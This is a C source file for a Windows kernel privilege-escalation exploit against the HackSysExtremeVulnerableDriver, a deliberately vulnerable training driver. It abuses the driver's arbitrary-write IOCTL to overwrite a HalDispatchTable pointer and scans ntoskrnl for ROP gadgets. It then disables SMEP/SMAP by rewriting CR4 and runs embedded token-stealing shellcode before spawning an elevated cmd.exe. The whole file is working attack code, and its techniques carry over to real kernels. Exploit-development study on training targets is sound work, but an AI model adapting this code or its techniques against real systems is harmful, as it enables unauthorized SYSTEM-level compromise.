#include <stdio.h>
#include <windows.h>

#define CR4_VALUE 0x350ef8
#define K_BASE 0xfffff807bda00000
#define IOCTL_ARBITRARY_WRITE 0x22200B
#define HAL_DISPATCH_TABLE_RVA 0xe00630
#define SHELLCODE_MAX_SIZE 512
#define ORIGINAL_HAL_RVA 0xb69b90

typedef NTSTATUS(NTAPI *_NtQueryIntervalProfile)(ULONG ProfileSource,
                                                 PULONG Interval);

typedef struct _WRITE_WHAT_WHERE {
  PVOID What;
  PVOID Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

DWORD GetModuleSize(HMODULE hModule) {
  if (!hModule)
    return 0;

  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
  if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((UINT8 *)hModule + pDosHeader->e_lfanew);
  if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    return 0;

  return pNtHeaders->OptionalHeader.SizeOfImage;
}

UINT8 *FindPattern(UINT8 *baseAddress, SIZE_T scanSize, const char *pattern,
                   const char *mask) {
  SIZE_T patternLength = strlen(mask);

  for (SIZE_T i = 0; i < scanSize - patternLength; i++) {
    BOOL found = TRUE;
    for (SIZE_T j = 0; j < patternLength; j++) {
      if (mask[j] == 'x' && baseAddress[i + j] != (UINT8)pattern[j]) {
        found = FALSE;
        break;
      }
    }
    if (found) {
      return &baseAddress[i];
    }
  }
  return NULL;
}

BOOL IsExecutableAddress(HMODULE hModule, DWORD rva) {
  PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
  PIMAGE_NT_HEADERS pNtHeaders =
      (PIMAGE_NT_HEADERS)((UINT8 *)hModule + pDosHeader->e_lfanew);
  PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

  for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
    if (rva >= pSection[i].VirtualAddress &&
        rva < (pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize)) {

      if ((pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
        return FALSE;
      if ((pSection[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0)
        return FALSE;

      char sectionName[9] = {0};
      memcpy(sectionName, pSection[i].Name, 8);
      if (_strnicmp(sectionName, "PAGE", 4) == 0 ||
          _strnicmp(sectionName, "INIT", 4) == 0) {
        return FALSE;
      }
      return TRUE;
    }
  }
  return FALSE;
}

DWORD ScanModuleForRVA(HMODULE hModule, const char *pattern, const char *mask,
                       const char *itemName, BOOL isExecutable) {
  DWORD imageSize = GetModuleSize(hModule);
  if (imageSize == 0) {
    if (itemName)
      printf("[-] Failed to parse PE headers for %s.\n", itemName);
    return 0;
  }

  UINT8 *startAddress = (UINT8 *)hModule;
  SIZE_T remainingSize = imageSize;

  while (remainingSize > 0) {
    UINT8 *match = FindPattern(startAddress, remainingSize, pattern, mask);
    if (!match)
      break;

    DWORD rva = (DWORD)(match - (UINT8 *)hModule);

    if (!isExecutable || IsExecutableAddress(hModule, rva)) {
      if (itemName) {
        if (isExecutable)
          printf("[+] Found Executable [%s] at RVA: 0x%lx\n", itemName, rva);
        else
          printf("[+] Found [%s] at RVA: 0x%lx\n", itemName, rva);
      }
      return rva;
    }

    SIZE_T offset = (match - startAddress) + 1;
    startAddress += offset;
    remainingSize -= offset;
  }

  if (itemName) {
    if (isExecutable)
      printf("[-] Failed to find executable pattern for [%s].\n", itemName);
    else
      printf("[-] Failed to find pattern for [%s].\n", itemName);
  }
  return 0;
}

SIZE_T BuildShell(PBYTE buffer, UINT64 MovCr4, UINT64 cr4Original) {
  PBYTE p = buffer;

#define EMIT(data, len)                                                        \
  do {                                                                         \
    memcpy(p, (data), (len));                                                  \
    p += (len);                                                                \
  } while (0)

  // mov rax, qword ptr gs:[188h]
  EMIT("\x65\x48\x8b\x04\x25\x88\x01\x00\x00", 9);

  // mov rbx, qword ptr [rax+28h]
  EMIT("\x48\x8B\x58\x28", 4);

  // sub rbx, 228h
  EMIT("\x48\x81\xEB\x28\x02\x00\x00", 7);

  // mov rsp, rbx
  EMIT("\x48\x89\xDC", 3);

  // mov rax, [rax+0xB8]
  EMIT("\x48\x8b\x80\xb8\x00\x00\x00", 7);

  // mov r8, rax
  EMIT("\x49\x89\xc0", 3);

  // mov r9, rax
  EMIT("\x4d\x89\xc1", 3);

  // TOKEN WALK LOOP
  // mov r9, qword ptr [r9+1D8h]
  EMIT("\x4d\x8b\x89\xd8\x01\x00\x00", 7);

  // sub r9, 1D8h
  EMIT("\x49\x81\xe9\xd8\x01\x00\x00", 7);

  // mov r10, qword ptr [r9+1D0h]
  EMIT("\x4d\x8b\x91\xd0\x01\x00\x00", 7);

  // cmp r10, 4
  EMIT("\x49\x83\xfa\x04", 4);

  // jne loop_start (back 27 bytes)
  EMIT("\x75\xe5", 2);

  // TOKEN SWAP
  // mov rcx, qword ptr [r9+248h]
  EMIT("\x49\x8b\x89\x48\x02\x00\x00", 7);

  // and cl, 0xf0
  EMIT("\x80\xe1\xf0", 3);

  // mov qword ptr [r8+248h], rcx
  EMIT("\x49\x89\x88\x48\x02\x00\x00", 7);

  // mov rcx, cr4Original
  EMIT("\x48\xB9", 2);
  memcpy(p, &cr4Original, 8);
  p += 8;

  // mov rax, MovCr4
  EMIT("\x48\xB8", 2);
  memcpy(p, &MovCr4, 8);
  p += 8;

  // jmp rax
  EMIT("\xFF\xE0", 2);

#undef EMIT
  return (SIZE_T)(p - buffer);
}

PVOID AllocateDynamic32BitStack(SIZE_T size) {
  ULONG_PTR startAddress = 0x10000000;
  ULONG_PTR endAddress = 0x7F000000;
  ULONG_PTR stepSize = 0x00100000;

  for (ULONG_PTR currentAddr = startAddress; currentAddr < endAddress;
       currentAddr += stepSize) {
    LPVOID allocated =
        VirtualAlloc((LPVOID)currentAddr, size, MEM_RESERVE | MEM_COMMIT,
                     PAGE_EXECUTE_READWRITE);
    if (allocated != NULL) {
      printf("[+] Allocated 32-bit addressable page at: 0x%p\n", allocated);
      return allocated;
    }
  }
  return NULL;
}

void WriteAndCall(ULONG64 whatValue, ULONG64 whereAddress, HANDLE hDevice,
                  PVOID fakeStackAddress) {
  WRITE_WHAT_WHERE www;
  www.What = (PVOID)&whatValue;
  www.Where = (PVOID)whereAddress;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_ARBITRARY_WRITE, &www, sizeof(www), NULL,
                       0, &bytesReturned, NULL)) {
    printf("[-] DeviceIoControl failed. Error: %lu\n", GetLastError());
    return;
  }

  _NtQueryIntervalProfile pNtQueryIntervalProfile =
      (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                              "NtQueryIntervalProfile");
  if (!pNtQueryIntervalProfile) {
    printf("[-] Failed to resolve NtQueryIntervalProfile\n");
    return;
  }

  printf("[+] Overwrote 0x%llX with 0x%llX\n", whereAddress, whatValue);
  printf("[+] Triggering NtQueryIntervalProfile (fakeStack=0x%p)\n",
         fakeStackAddress);

  pNtQueryIntervalProfile(0, (PULONG)fakeStackAddress);
}

int main(void) {
  HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                               GENERIC_READ | GENERIC_WRITE, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Failed to open HEVD. Error: %lu\n", GetLastError());
    return 1;
  }
  printf("[+] HEVD handle acquired.\n");

  HMODULE hNtoskrnl = LoadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe",
                                     NULL, DONT_RESOLVE_DLL_REFERENCES);
  if (!hNtoskrnl) {
    printf("[-] Failed to load ntoskrnl.exe\n");
    return 1;
  }

  DWORD rvaPopRcx =
      ScanModuleForRVA(hNtoskrnl, "\x59\xC3", "xx", "pop rcx ; ret", TRUE);
  DWORD rvaMovCr4 = ScanModuleForRVA(hNtoskrnl, "\x0F\x22\xE1\xC3", "xxxx",
                                     "mov cr4, rcx ; ret", TRUE);
  DWORD rvaMovEspEbx = ScanModuleForRVA(hNtoskrnl, "\x8B\xE3\xC3", "xxx",
                                        "mov esp, ebx ; ret", TRUE);

  if (!rvaPopRcx || !rvaMovCr4 || !rvaMovEspEbx) {
    printf("[-] Missing required gadgets. Aborting.\n");
    return 1;
  }

  UINT64 kBase = K_BASE;
  UINT64 gPopRcx = kBase + rvaPopRcx;
  UINT64 gMovCr4 = kBase + rvaMovCr4;
  UINT64 gMovEspEbx = kBase + rvaMovEspEbx;

  printf("[+] Gadgets resolved:\n");
  printf("    pop rcx ; ret       = 0x%llX\n", gPopRcx);
  printf("    mov cr4, rcx ; ret  = 0x%llX\n", gMovCr4);
  printf("    mov esp, ebx ; ret  = 0x%llX\n", gMovEspEbx);

  printf("[*] Press ENTER to fire the exploit...\n");
  getchar();

  UINT64 cr4Original = CR4_VALUE;
  UINT64 cr4Off = cr4Original & ~((1ULL << 20) | (1ULL << 21));

  PBYTE shellcode =
      (PBYTE)VirtualAlloc(NULL, SHELLCODE_MAX_SIZE, MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
  if (!shellcode) {
    printf("[-] VirtualAlloc failed for shellcode. Error: %lu\n",
           GetLastError());
    return 1;
  }

  SIZE_T shellSize = BuildShell(shellcode, gMovCr4, cr4Original);
  if (shellSize == 0) {
    printf("[-] BuildShell failed.\n");
    return 1;
  }
  printf("[+] Shellcode built: %zu bytes\n", shellSize);

  ULONG_PTR *fakeStack = (ULONG_PTR *)AllocateDynamic32BitStack(0x1000);
  if (!fakeStack) {
    printf("[-] Failed to allocate 32-bit fake stack.\n");
    return 1;
  }

  fakeStack[0] = gPopRcx;            // pop rcx ; ret
  fakeStack[1] = cr4Off;             // CR4 with SMEP/SMAP disabled
  fakeStack[2] = gMovCr4;            // mov cr4, rcx ; ret
  fakeStack[3] = (ULONG64)shellcode; // Jump to token-stealing shellcode

  UINT64 target = kBase + HAL_DISPATCH_TABLE_RVA + 0x8;
  UINT64 originalHal = ORIGINAL_HAL_RVA + kBase;

  WriteAndCall(gMovEspEbx, target, hDevice, fakeStack);
  WriteAndCall(originalHal, target, hDevice, NULL);

  printf("[+] Spawning cmd.exe...\n");
  system("cmd.exe");

  VirtualFree(fakeStack, 0, MEM_RELEASE);
  VirtualFree(shellcode, 0, MEM_RELEASE);
  CloseHandle(hDevice);

  return 0;
}
